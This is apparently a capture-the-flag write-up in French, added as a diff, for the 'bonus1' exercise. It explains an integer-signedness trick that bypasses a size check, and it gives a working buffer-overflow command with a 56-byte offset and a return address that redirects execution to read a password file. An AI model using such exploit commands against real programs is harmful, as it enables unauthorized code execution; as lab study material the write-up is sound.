@@ -1,0 +1,16 @@
+En reecrivant la source du binaire nous nous sommes rendu compte que le programme
+prend deux parametres.Le premier parametre est converti en int grace a atoi.
+Quant au second il est copie dans un buffer de 44 byte. Malheureusement
+si on passe un nombre supp a 9, le programme quite. Nous avons donc pense a
+passer un int negtif car ce dernier est multiplie par 4 et il est caste
+en size_t qui est un non signe. Nous pouvions donc lui passer un int negatif
+qui corresponderai au offset du buffer.
+Nous avons donc trouve l'offset qui est de 56.
+
+./bonus1 -2147483633 $(python -c "print 'a' * 56 + '\x82\x84\x04\x08'")
+
+-2147483633: 60 losrque ce dernier est caste
+
+'\x82\x84\x04\x08': adresse de l'initialisation des para passe a execl
+
+cat cheminPourLePass
